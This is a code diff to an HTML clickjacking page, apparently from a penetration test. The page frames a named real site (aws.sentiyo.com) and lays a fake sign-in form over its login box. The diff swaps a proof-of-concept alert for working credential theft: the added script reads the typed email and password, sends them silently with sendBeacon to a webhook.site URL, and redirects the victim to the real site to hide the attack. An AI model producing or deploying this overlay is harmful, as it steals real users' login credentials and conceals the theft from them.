@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Management Console - Sign In</title>
     <style>
-        /* Ensures the malicious wrapper fills the entire browser window */
+        /* Zero out margins to allow full-screen coverage */
         body, html {
             margin: 0;
             padding: 0;
@@ -15,7 +15,7 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* The legitimate site is loaded in the background */
+        /* The legitimate Sentiyo site loads in the background */
         .target-frame { 
             border: none;
             width: 100vw; 
@@ -24,17 +24,17 @@
             z-index: 1;
         }
 
-        /* The Malicious Overlay: This box sits directly over the real login area */
+        /* The Malicious Overlay Form: Aligns over the real login box */
         .login-overlay {
             position: absolute;
-            top: 45%; /* You may need to adjust this % to align with the real site's box */
+            top: 45%; 
             left: 50%;
             transform: translate(-50%, -50%);
             background: #ffffff;
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            z-index: 100; /* Ensures it is on top of the iframe */
+            z-index: 100; 
             width: 350px;
             text-align: center;
         }
@@ -52,15 +52,13 @@
         .login-overlay button {
             width: 98%;
             padding: 12px;
-            background-color: #0056b3; /* Match the customer's brand color */
+            background-color: #0056b3; 
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
         }
-
-        .login-overlay button:hover { background-color: #004494; }
     </style>
 </head>
 <body>
@@ -76,18 +74,23 @@
 
     <script>
         function captureData() {
-            // Retrieve the data typed by the user into the fake form
             const email = document.getElementById('fake_user').value;
             const pass = document.getElementById('fake_pass').value;
 
-            // In a VAPT report, this alert serves as proof that data was stolen
-            alert("VAPT EXPLOIT CONFIRMED\n\n" + 
-                  "Attacker has captured the following:\n" +
-                  "Email: " + email + "\n" +
-                  "Password: " + pass);
-            
-            // Real attackers would now redirect the user to the actual site
-            // window.location.href = "https://aws.sentiyo.com";
+            // PASTE YOUR UNIQUE WEBHOOK.SITE URL HERE
+            const webhookURL = "https://webhook.site/000bbebf-f7bb-461d-9213-3b62a199b823";
+
+            // Use Beacon API to send data silently in the background
+            const payload = new FormData();
+            payload.append('Target', 'aws.sentiyo.com');
+            payload.append('Email', email);
+            payload.append('Password', pass);
+            payload.append('Vulnerability', 'Clickjacking / UI Redressing');
+
+            navigator.sendBeacon(webhookURL, payload);
+
+            // Immediate redirect to the real site to hide the attack
+            window.location.href = "https://aws.sentiyo.com"; 
         }
     </script>
 
